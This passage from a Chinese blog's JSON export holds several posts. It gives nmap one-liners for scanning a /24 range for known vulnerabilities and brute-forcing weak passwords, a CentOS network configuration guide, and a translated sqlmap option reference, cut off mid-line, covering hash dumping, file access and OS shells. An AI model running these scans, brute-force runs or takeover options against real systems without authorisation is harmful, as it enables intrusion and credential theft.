class=\"number\">.0</span>/<span class=\"number\">24</span>,shodan-api.apikey=SHODANAPIKEY’</span><br></pre></td></tr></table></figure>\n<p>0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描</p>\n<p>实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sT -Pn -v –script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-<span class=\"number\">4221.</span>nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-<span class=\"built_in\">short</span>-name-brute.nse,http-put.nse,http-php-<span class=\"keyword\">version</span>.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-<span class=\"keyword\">enum</span>.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-<span class=\"keyword\">version</span>.nse,memcached-info.nse,mongodb-info.nse,msrpc-<span class=\"keyword\">enum</span>.nse,ms-sql-info.nse,mysql-info.nse,nrpe-<span class=\"keyword\">enum</span>.nse,pptp-<span class=\"keyword\">version</span>.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-<span class=\"number\">2012</span>–<span class=\"number\">1182.</span>nse,smb-vuln-ms08-<span class=\"number\">067.</span>nse,smb-vuln-ms17-<span class=\"number\">010.</span>nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-<span class=\"keyword\">enum</span>.nse,teamspeak2-<span class=\"keyword\">version</span>.nse <span class=\"number\">192.168</span>.3.0/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"设置CentOS服务器IP地址","abbrlink":33748,"_content":"\n### 前言\n\n如何在CentOS服务器中配置网络IP地址\n\n<!--more-->\n\n### 设置IP地址\n\n```shell\ncd /etc/sysconfig/network-scripts/\n```\n\n查看配置信息\n\n```shell\nifconfig\n```\n\n编辑网卡配置\n\n```shell\nvim ifcfg-eno1\n```\n\n编辑信息，建议 `ONBOOT=yes`，以后开机就会自动联网：\n\n```ini\nTYPE=\"Ethernet\"\nBOOTPROTO=\"none\"\nDEFROUTE=\"yes\"\nIPV4_FAILURE_FATAL=\"no\"\nIPV6INIT=\"yes\"\nIPV6_AUTOCONF=\"yes\"\nIPV6_DEFROUTE=\"yes\"\nIPV6_FAILURE_FATAL=\"no\"\nNAME=\"eno1\"\nUUID=\"c63850e5-4c25-46c7-a030-574fcf824ad5\"\nDEVICE=\"eno1\" #设备别名\nONBOOT=\"yes\"\nIPADDR1=202.95.22.222 #从IP地址1\nPREFIX1=\"25\"\nIPADDR2=202.95.22.233 #从IP地址2\nPREFIX2=\"25\"\nDNS1=\"8.8.8.8\" #DNS服务器\nIPADDR=202.95.22.212  #设置主IP地址\nPREFIX=25\nGATEWAY=202.95.8.129 #网关\nIPV6_PEERDNS=yes\nIPV6_PEERROUTES=yes\nIPV6_PRIVACY=no\n```\n\n### 重启网络配置\n\n```shell\nsystemctl restart network\n ```\n","source":"_posts/2020/2/设置CentOS服务器IP地址.md","raw":"---\nlayout: post\ntitle: 设置CentOS服务器IP地址\ntags:\n  - linux\ncategories:\n  - linux\nabbrlink: 33748\n---\n\n### 前言\n\n如何在CentOS服务器中配置网络IP地址\n\n<!--more-->\n\n### 设置IP地址\n\n```shell\ncd /etc/sysconfig/network-scripts/\n```\n\n查看配置信息\n\n```shell\nifconfig\n```\n\n编辑网卡配置\n\n```shell\nvim ifcfg-eno1\n```\n\n编辑信息，建议 `ONBOOT=yes`，以后开机就会自动联网：\n\n```ini\nTYPE=\"Ethernet\"\nBOOTPROTO=\"none\"\nDEFROUTE=\"yes\"\nIPV4_FAILURE_FATAL=\"no\"\nIPV6INIT=\"yes\"\nIPV6_AUTOCONF=\"yes\"\nIPV6_DEFROUTE=\"yes\"\nIPV6_FAILURE_FATAL=\"no\"\nNAME=\"eno1\"\nUUID=\"c63850e5-4c25-46c7-a030-574fcf824ad5\"\nDEVICE=\"eno1\" #设备别名\nONBOOT=\"yes\"\nIPADDR1=202.95.22.222 #从IP地址1\nPREFIX1=\"25\"\nIPADDR2=202.95.22.233 #从IP地址2\nPREFIX2=\"25\"\nDNS1=\"8.8.8.8\" #DNS服务器\nIPADDR=202.95.22.212  #设置主IP地址\nPREFIX=25\nGATEWAY=202.95.8.129 #网关\nIPV6_PEERDNS=yes\nIPV6_PEERROUTES=yes\nIPV6_PRIVACY=no\n```\n\n### 重启网络配置\n\n```shell\nsystemctl restart network\n ```\n","slug":"2020/2/设置CentOS服务器IP地址","published":1,"date":"2020-02-25T17:08:24.973Z","updated":"2020-04-12T06:34:43.630Z","comments":1,"photos":[],"link":"","_id":"ck9z76w01002744vqwws5i1oy","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>如何在CentOS服务器中配置网络IP地址</p>\n<a id=\"more\"></a>\n<h3 id=\"设置IP地址\"><a href=\"#设置IP地址\" class=\"headerlink\" title=\"设置IP地址\"></a>设置IP地址</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/sysconfig/network-scripts/</span><br></pre></td></tr></table></figure>\n<p>查看配置信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig</span><br></pre></td></tr></table></figure>\n<p>编辑网卡配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ifcfg-eno1</span><br></pre></td></tr></table></figure>\n<p>编辑信息，建议 <code>ONBOOT=yes</code>，以后开机就会自动联网：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">TYPE</span>=<span class=\"string\">\"Ethernet\"</span></span><br><span class=\"line\"><span class=\"attr\">BOOTPROTO</span>=<span class=\"string\">\"none\"</span></span><br><span class=\"line\"><span class=\"attr\">DEFROUTE</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV4_FAILURE_FATAL</span>=<span class=\"string\">\"no\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6INIT</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_AUTOCONF</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_DEFROUTE</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_FAILURE_FATAL</span>=<span class=\"string\">\"no\"</span></span><br><span class=\"line\"><span class=\"attr\">NAME</span>=<span class=\"string\">\"eno1\"</span></span><br><span class=\"line\"><span class=\"attr\">UUID</span>=<span class=\"string\">\"c63850e5-4c25-46c7-a030-574fcf824ad5\"</span></span><br><span class=\"line\"><span class=\"attr\">DEVICE</span>=<span class=\"string\">\"eno1\"</span> #设备别名</span><br><span class=\"line\"><span class=\"attr\">ONBOOT</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPADDR1</span>=<span class=\"number\">202.95</span>.<span class=\"number\">22.222</span> #从IP地址<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">PREFIX1</span>=<span class=\"string\">\"25\"</span></span><br><span class=\"line\"><span class=\"attr\">IPADDR2</span>=<span class=\"number\">202.95</span>.<span class=\"number\">22.233</span> #从IP地址<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"attr\">PREFIX2</span>=<span class=\"string\">\"25\"</span></span><br><span class=\"line\"><span class=\"attr\">DNS1</span>=<span class=\"string\">\"8.8.8.8\"</span> #DNS服务器</span><br><span class=\"line\"><span class=\"attr\">IPADDR</span>=<span class=\"number\">202.95</span>.<span class=\"number\">22.212</span>  #设置主IP地址</span><br><span class=\"line\"><span class=\"attr\">PREFIX</span>=<span class=\"number\">25</span></span><br><span class=\"line\"><span class=\"attr\">GATEWAY</span>=<span class=\"number\">202.95</span>.<span class=\"number\">8.129</span> #网关</span><br><span class=\"line\"><span class=\"attr\">IPV6_PEERDNS</span>=<span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_PEERROUTES</span>=<span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_PRIVACY</span>=<span class=\"literal\">no</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"重启网络配置\"><a href=\"#重启网络配置\" class=\"headerlink\" title=\"重启网络配置\"></a>重启网络配置</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart network</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>如何在CentOS服务器中配置网络IP地址</p>","more":"<h3 id=\"设置IP地址\"><a href=\"#设置IP地址\" class=\"headerlink\" title=\"设置IP地址\"></a>设置IP地址</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/sysconfig/network-scripts/</span><br></pre></td></tr></table></figure>\n<p>查看配置信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig</span><br></pre></td></tr></table></figure>\n<p>编辑网卡配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ifcfg-eno1</span><br></pre></td></tr></table></figure>\n<p>编辑信息，建议 <code>ONBOOT=yes</code>，以后开机就会自动联网：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">TYPE</span>=<span class=\"string\">\"Ethernet\"</span></span><br><span class=\"line\"><span class=\"attr\">BOOTPROTO</span>=<span class=\"string\">\"none\"</span></span><br><span class=\"line\"><span class=\"attr\">DEFROUTE</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV4_FAILURE_FATAL</span>=<span class=\"string\">\"no\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6INIT</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_AUTOCONF</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_DEFROUTE</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_FAILURE_FATAL</span>=<span class=\"string\">\"no\"</span></span><br><span class=\"line\"><span class=\"attr\">NAME</span>=<span class=\"string\">\"eno1\"</span></span><br><span class=\"line\"><span class=\"attr\">UUID</span>=<span class=\"string\">\"c63850e5-4c25-46c7-a030-574fcf824ad5\"</span></span><br><span class=\"line\"><span class=\"attr\">DEVICE</span>=<span class=\"string\">\"eno1\"</span> #设备别名</span><br><span class=\"line\"><span class=\"attr\">ONBOOT</span>=<span class=\"string\">\"yes\"</span></span><br><span class=\"line\"><span class=\"attr\">IPADDR1</span>=<span class=\"number\">202.95</span>.<span class=\"number\">22.222</span> #从IP地址<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">PREFIX1</span>=<span class=\"string\">\"25\"</span></span><br><span class=\"line\"><span class=\"attr\">IPADDR2</span>=<span class=\"number\">202.95</span>.<span class=\"number\">22.233</span> #从IP地址<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"attr\">PREFIX2</span>=<span class=\"string\">\"25\"</span></span><br><span class=\"line\"><span class=\"attr\">DNS1</span>=<span class=\"string\">\"8.8.8.8\"</span> #DNS服务器</span><br><span class=\"line\"><span class=\"attr\">IPADDR</span>=<span class=\"number\">202.95</span>.<span class=\"number\">22.212</span>  #设置主IP地址</span><br><span class=\"line\"><span class=\"attr\">PREFIX</span>=<span class=\"number\">25</span></span><br><span class=\"line\"><span class=\"attr\">GATEWAY</span>=<span class=\"number\">202.95</span>.<span class=\"number\">8.129</span> #网关</span><br><span class=\"line\"><span class=\"attr\">IPV6_PEERDNS</span>=<span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_PEERROUTES</span>=<span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">IPV6_PRIVACY</span>=<span class=\"literal\">no</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"重启网络配置\"><a href=\"#重启网络配置\" class=\"headerlink\" title=\"重启网络配置\"></a>重启网络配置</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart network</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"sqlmap基本使用","abbrlink":41891,"_content":"### 前言\n\nSQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。\n\n<!--more-->\n\n### Options（选项）\n\n```\nUsage: python sqlmap.py [options]\n\nOptions（选项）:\n\n-h, --help Show basic help message and exit\n## 展示帮助文档 参数\n\n-hh Show advanced help message and exit\n## 展示详细帮助文档参数\n\n--version Show program's version number and exit\n## 显示程序的版本号\n\n-v VERBOSE Verbosity level: 0-6 (default 1)\n## 详细级别：0-6（默认为1）\n```\n\n\n### Target（目标）\n\n```\nTarget（目标）:\n\nAt least one of these options has to be provided to define the target(s)\n\n-d DIRECT Connection string for direct database connection\n## 指定具体数据库\n\n-u URL, --url=URL Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n## 目标URL\n\n-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file\n## 解析目标(s)从Burp或WebScarab代理日志文件\n\n-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file\n## 解析目标(s)从远程站点地图文件(.xml)\n\n-m BULKFILE Scan multiple targets given in a textual file\n## 扫描文本文件中给出的多个目标\n\n-r REQUESTFILE Load HTTP request from a file\n## 从本地文件加载HTTP请求 ，多用于post注入。\n\n-g GOOGLEDORK Process Google dork results as target URLs\n## 处理Google的结果作为目标URL。\n\n-c CONFIGFILE Load options from a configuration INI file\n## 从INI配置文件中加载选项。\n```\n\n### Request（请求）\n\n```\nRequest（请求）:\n​\nThese options can be used to specify how to connect to the target URL\n## 这些选项可以用来指定如何连接到目标URL。\n​\n--method=METHOD Force usage of given HTTP method (e.g. PUT)\n## 强制使用给定的HTTP方法（e.g. PUT）\n​\n--data=DATA Data string to be sent through POST\n## 通过POST发送的数据字符串\n​\n--param-del=PARA.. Character used for splitting parameter values\n## 用于拆分参数值的字符\n​\n--cookie=COOKIE HTTP Cookie header value HTTP\n## Cookie头的值\n​\n--cookie-del=COO.. Character used for splitting cookie values\n## 用于分割Cookie值的字符\n\n--load-cookies=L.. File containing cookies in Netscape/wget format\n## 包含Netscape / wget格式的cookie的文件\n\n--drop-set-cookie Ignore Set-Cookie header from response\n## 从响应中忽略Set-Cookie头\n\n--user-agent=AGENT HTTP User-Agent header value\n## 指定 HTTP User - Agent头\n\n--random-agent Use randomly selected HTTP User-Agent header value\n##  使用随机选定的HTTP User - Agent头\n\n--host=HOST HTTP Host header value\n## HTTP主机头值\n\n--referer=REFERER HTTP Referer header value\n##  指定 HTTP Referer头\n\n-H HEADER, --hea.. Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")\n## 额外header\n\n--headers=HEADERS Extra headers (e.g. \"Accept-Language: fr\\\\nETag: 123\")\n## 额外header\n\n--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP\n## 认证类型(Basic, Digest, NTLM or PKI)\n\n--auth-cred=AUTH.. HTTP authentication credentials (name:password)\n##  HTTP认证凭证(name:password)\n\n--auth-file=AUTH.. HTTP authentication PEM cert/private key file\n## HTTP认证 PEM认证/私钥文件\n\n--ignore-401 Ignore HTTP Error 401 (Unauthorized)\n## 忽略HTTP错误401\n\n--proxy=PROXY Use a proxy to connect to the target URL\n## 使用代理连接到目标网址\n\n--proxy-cred=PRO.. Proxy authentication credentials (name:password)\n## 代理认证证书(name:password)\n\n--proxy-file=PRO.. Load proxy list from a file\n## 从文件中加载代理列表\n\n--ignore-proxy Ignore system default proxy settings\n## 忽略系统默认代理设置\n\n--tor Use Tor anonymity network\n## 使用Tor匿名网络\n\n--tor-port=TORPORT Set Tor proxy port other than default\n##  设置Tor代理端口而不是默认值\n\n--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)\n## 设置Tor代理类型\n\n--check-tor Check to see if Tor is used properly\n## 检查Tor是否正确使用\n\n--delay=DELAY Delay in seconds between each HTTP request\n## 每个HTTP请求之间的延迟（秒）\n\n--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)\n## 秒超时连接前等待（默认30）\n\n--retries=RETRIES Retries when the connection timeouts (default 3)\n##  连接超时时重试（默认值3）\n\n--randomize=RPARAM Randomly change value for given parameter(s)\n## 随机更改给定参数的值(s)\n\n--safe-url=SAFEURL URL address to visit frequently during testing\n## 在测试期间频繁访问的URL地址\n\n--safe-post=SAFE.. POST data to send to a safe URL\n## POST数据发送到安全URL\n\n--safe-req=SAFER.. Load safe HTTP request from a file\n## 从文件加载安全HTTP请求\n\n--safe-freq=SAFE.. Test requests between two visits to a given safe URL\n## 在两次访问给定安全网址之间测试请求\n\n--skip-urlencode Skip URL encoding of payload data\n## 跳过有效载荷数据的URL编码\n\n--csrf-token=CSR.. Parameter used to hold anti-CSRF token\n## 参数用于保存anti-CSRF令牌\n\n--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token\n## 提取anti-CSRF URL地址访问令牌\n\n--force-ssl Force usage of SSL/HTTPS\n## 强制使用SSL /HTTPS\n\n--hpp Use HTTP parameter pollution method\n## 使用HTTP参数pollution的方法\n\n--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码\"import hashlib;id2=hashlib.md5(id).hexdigest()\")\n```\n\n### Optimization（优化）\n\n```\nOptimization（优化）:\n​\nThese options can be used to optimize the performance of sqlmap\n## 这些选项可用于优化sqlmap的性能\n​\n-o Turn on all optimization switches\n## 开启所有优化开关\n​\n--predict-output Predict common queries output\n## 预测常见的查询输出\n​\n--keep-alive Use persistent HTTP(s) connections\n## 使用持久的HTTP（S）连接\n​\n--null-connection Retrieve page length without actual HTTP response body\n## 从没有实际的HTTP响应体中检索页面长度\n​\n--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)\n## 最大的HTTP（S）请求并发量（默认为1）\n```\n\n\n### Injection（注入）\n\n\n```\nInjection（注入）:\n​\nThese options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts\n##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。\n​\n-p TESTPARAMETER Testable parameter(s)\n## 可测试的参数（S）\n​\n--skip=SKIP Skip testing for given parameter(s)\n## 跳过对给定参数的测试\n​\n--skip-static Skip testing parameters that not appear to be dynamic\n## 跳过测试不显示为动态的参数\n​\n--param-exclude=.. Regexp to exclude parameters from testing (e.g. \"ses\")\n## 使用正则表达式排除参数进行测试（e.g. \"ses\"）\n​\n--dbms=DBMS Force back-end DBMS to this value\n## 强制后端的DBMS为此值\n​\n--dbms-cred=DBMS.. DBMS authentication credentials (user:password)\n## DBMS认证凭证(user:password)\n​\n--os=OS Force back-end DBMS operating system to this value\n## 强制后端的DBMS操作系统为这个值\n​\n--invalid-bignum Use big numbers for invalidating values\n## 使用大数字使值无效\n​\n--invalid-logical Use logical operations for invalidating values\n## 使用逻辑操作使值无效\n​\n--invalid-string Use random strings for invalidating values\n## 使用随机字符串使值无效\n​\n--no-cast Turn off payload casting mechanism\n## 关闭有效载荷铸造机制\n​\n--no-escape Turn off string escaping mechanism\n## 关闭字符串转义机制\n​\n--prefix=PREFIX Injection payload prefix string\n## 注入payload字符串前缀\n​\n--suffix=SUFFIX Injection payload suffix string\n## 注入payload字符串后缀\n​\n--tamper=TAMPER Use given script(s) for tampering injection data\n## 使用给定的脚本（S）篡改注入数据\n```\n\n\n### Detection（检测）\n\n\n```\nDetection（检测）:\nThese options can be used to customize the detection phase\n## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。\n​\n--level=LEVEL Level of tests to perform (1-5, default 1)\n## 执行测试的等级（1-5，默认为1）\n​\n--risk=RISK Risk of tests to perform (1-3, default 1)\n## 执行测试的风险（0-3，默认为1）\n​\n--string=STRING String to match when query is evaluated to True\n##  查询时有效时在页面匹配字符串\n​\n--not-string=NOT.. String to match when query is evaluated to False\n## 当查询求值为无效时匹配的字符串\n​\n--regexp=REGEXP Regexp to match when query is evaluated to True\n## 查询时有效时在页面匹配正则表达式\n​\n--code=CODE HTTP code to match when query is evaluated to True\n## 当查询求值为True时匹配的HTTP代码\n​\n--text-only Compare pages based only on the textual content\n## 仅基于在文本内容比较网页\n​\n--titles Compare pages based only on their titles\n##  仅根据他们的标题进行比较\n\n```\n\n\n\n### Techniques（技巧）\n\n\n```\nTechniques（技巧）:\nThese options can be used to tweak testing of specific SQL injection techniques\n## 这些选项可用于调整具体的SQL注入测试。\n​\n--technique=TECH SQL injection techniques to use (default \"BEUSTQ\")\n## SQL 注入技术测试（默认BEUST）\n​\n--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)\n##  DBMS响应的延迟时间（默认为5秒）\n​\n--union-cols=UCOLS Range of columns to test for UNION query SQL injection\n##  定列范围用于测试UNION查询注入\n​\n--union-char=UCHAR Character to use for bruteforcing number of columns\n##  用于暴力猜解列数的字符\n​\n--union-from=UFROM Table to use in FROM part of UNION query SQL injection\n##  要在UNION查询SQL注入的FROM部分使用的表\n​\n--dns-domain=DNS.. Domain name used for DNS exfiltration attack\n##  域名用于DNS漏出攻击\n​\n--second-order=S.. Resulting page URL searched for second-order response\n## 生成页面的URL搜索为second-order响应\n```\n\n\n### Fingerprint（指纹）\n\n```\nFingerprint（指纹）:\n​\n-f, --fingerprint Perform an extensive DBMS version fingerprint\n## 执行检查广泛的DBMS版本指纹\n```\n\n\n### Enumeration（枚举）\n\n```\nEnumeration（枚举）:\n​\nThese options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements\n## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。\n​\n-a, --all Retrieve everything\n## 检索一切\n​\n-b, --banner Retrieve DBMS banner\n## 检索数据库管理系统的标识\n​\n--current-user Retrieve DBMS current user\n##  检索数据库管理系统的 标识\n​\n--current-db Retrieve DBMS current database\n## 检索数据库管理系统当前数据库\n​\n-hostname Retrieve DBMS server hostname\n## 检索数据库服务器的主机名\n​\n--is-dba Detect if the DBMS current user is DBA\n## 检测DBMS当前用户是否DBA\n​\n--users Enumerate DBMS users\n## 枚举数据库管理系统用户\n​\n--passwords Enumerate DBMS users password hashes\n## 枚举数据库管理系统用户密码哈希\n​\n--privileges Enumerate DBMS users privileges\n## 枚举数据库管理系统用户的权限\n​\n--roles Enumerate DBMS users roles\n## 枚举数据库管理系统用户的角色\n​\n--dbs Enumerate DBMS databases\n## 枚举数据库管理系统数据库\n​\n--tables Enumerate DBMS database tables\n##  枚举的DBMS数据库中的表\n​\n--columns Enumerate DBMS database table columns\n## 枚举DBMS数据库表列\n​\n--schema Enumerate DBMS schema\n## 枚举数据库架构\n​\n--count Retrieve number of entries for table(s)\n## 检索表的条目数\n​\n--dump Dump DBMS database table entries\n##  转储数据库管理系统的数据库中的表项\n​\n--dump-all Dump all DBMS databases tables entries\n## 转储数据库管理系统的数据库中的表项\n​\n--search Search column(s), table(s) and/or database name(s)\n##  搜索列（S），表（S）和/或数据库名称（S）\n​\n--comments Retrieve DBMS comments\n##  检索数据库的comments(注释、评论)\n​\n-D DB DBMS database to enumerate\n## 要进行枚举的数据库名\n​\n-T TBL DBMS database table(s) to enumerate\n##  要进行枚举的数据库表\n​\n-C COL DBMS database table column(s) to enumerate\n## 要进行枚举的数据库列\n​\n-X EXCLUDECOL DBMS database table column(s) to not enumerate\n## 要不进行枚举的数据库列\n​\n-U USER DBMS user to enumerate\n## 用来进行枚举的数据库用户\n​\n--exclude-sysdbs Exclude DBMS system databases when enumerating tables\n##  枚举表时排除系统数据库\n​\n--pivot-column=P.. Pivot column name\n## 主列名称\n​\n--where=DUMPWHERE Use WHERE condition while table dumping\n## 使用WHERE条件进行表转储\n​\n--start=LIMITSTART First query output entry to retrieve\n##  第一个查询输出进入检索\n​\n--stop=LIMITSTOP Last query output entry to retrieve\n## 最后查询的输出进入检索\n​\n--first=FIRSTCHAR First query output word character to retrieve\n## 第一个查询输出字的字符检索\n​\n--last=LASTCHAR Last query output word character to retrieve\n## 最后查询的输出字字符检索\n​\n--sql-query=QUERY SQL statement to be executed\n## 要执行的SQL语句\n​\n--sql-shell Prompt for an interactive SQL shell\n## 提示交互式SQL的shell\n​\n--sql-file=SQLFILE Execute SQL statements from given file(s)\n## 从给定文件执行SQL语句\n```\n\n\n### Brute Force（蛮力）\n\n\n```\nBrute force（蛮力）:\n​\nThese options can be used to run brute force checks\n## 这些选项可以被用来运行蛮力检查。\n​\n--common-tables Check existence of common tables\n## 检查存在共同表\n​\n--common-columns Check existence of common columns\n## 检查存在共同列\n```\n\n\n### User-defined function injection（用户自定义函数注入）\n\n\n```\nUser-defined function injection（用户自定义函数注入）:\n​\nThese options can be used to create custom user-defined functions\n## 这些选项可以用来创建用户自定义函数。\n​\n--udf-inject Inject custom user-defined functions\n## 注入用户自定义函数\n​\n--shared-lib=SHLIB Local path of the shared library\n## 共享库的本地路径\n```\n\n\n### File system access（访问文件系统）\n\n\n```\nFile system access（访问文件系统）:\nThese options can be used to access the back-end database management system underlying file system\n## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。\n​\n--file-read=RFILE Read a file from the back-end DBMS file system\n## 从后端的数据库管理系统文件系统读取文件\n​\n--file-write=WFILE Write a local file on the back-end DBMS file system\n## 编辑后端的数据库管理系统文件系统上的本地文件\n​\n--file-dest=DFILE Back-end DBMS absolute filepath to write to\n## 后端的数据库管理系统写入文件的绝对路径\n```\n\n\n### Operating system access（操作系统访问）\n\n```\nOperating system access（操作系统访问）:\n​\nThese options can be used to access the back-end database management system underlying operating system\n## 这些选项可以用于访问后端数据库管理系统的底层操作系统。\n​\n--os-cmd=OSCMD Execute an operating system command\n## 执行操作系统命令\n​\n--os-shell Prompt for an interactive operating system shell\n##  交互式的操作系统的shell\n​\n--os-pwn Prompt for an OOB 